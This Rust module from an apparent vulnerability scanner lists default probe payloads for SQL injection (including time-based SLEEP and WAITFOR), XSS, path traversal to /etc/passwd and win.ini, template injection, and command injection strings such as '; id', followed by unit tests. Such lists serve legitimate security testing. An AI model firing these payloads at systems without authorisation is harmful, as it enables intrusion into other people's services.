use super::scanner::VulnCategory;

pub struct PayloadSet {
    pub category: VulnCategory,
    pub payloads: &'static [&'static str],
}

pub fn default_sets() -> Vec<PayloadSet> {
    vec![
        PayloadSet {
            category: VulnCategory::SqlInjection,
            payloads: &[
                "'",
                "\"",
                "' OR '1'='1",
                "1' OR '1'='1' --",
                "1 AND SLEEP(5)",
                "1' AND SLEEP(5)--",
                "'; WAITFOR DELAY '0:0:5'--",
                "1 UNION SELECT NULL--",
            ],
        },
        PayloadSet {
            category: VulnCategory::Xss,
            payloads: &[
                "<script>alert(1)</script>",
                "\"><svg/onload=alert(1)>",
                "javascript:alert(1)",
                "<img src=x onerror=alert(1)>",
            ],
        },
        PayloadSet {
            category: VulnCategory::PathTraversal,
            payloads: &[
                "../../../../etc/passwd",
                "..%2f..%2f..%2fetc%2fpasswd",
                "....//....//etc/passwd",
                "..\\..\\..\\windows\\win.ini",
            ],
        },
        PayloadSet {
            category: VulnCategory::Ssti,
            payloads: &["{{7*7}}", "${7*7}", "#{7*7}", "<%= 7*7 %>"],
        },
        PayloadSet {
            category: VulnCategory::CommandInjection,
            payloads: &["; id", "| id", "`id`", "$(id)", "&& id"],
        },
    ]
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::collections::HashSet;

    #[test]
    fn contains_all_categories() {
        let cats: HashSet<_> = default_sets().into_iter().map(|s| s.category).collect();
        assert!(cats.contains(&VulnCategory::SqlInjection));
        assert!(cats.contains(&VulnCategory::Xss));
        assert!(cats.contains(&VulnCategory::PathTraversal));
        assert!(cats.contains(&VulnCategory::Ssti));
        assert!(cats.contains(&VulnCategory::CommandInjection));
    }

    #[test]
    fn no_payload_is_empty() {
        for s in default_sets() {
            assert!(!s.payloads.is_empty(), "set {:?} vazio", s.category);
            for p in s.payloads {
                assert!(!p.trim().is_empty());
            }
        }
    }

    #[test]
    fn time_based_sqli_included() {
        let sets = default_sets();
        let sqli = sets.iter().find(|s| s.category == VulnCategory::SqlInjection).unwrap();
        assert!(sqli.payloads.iter().any(|p| p.contains("SLEEP")));
    }
}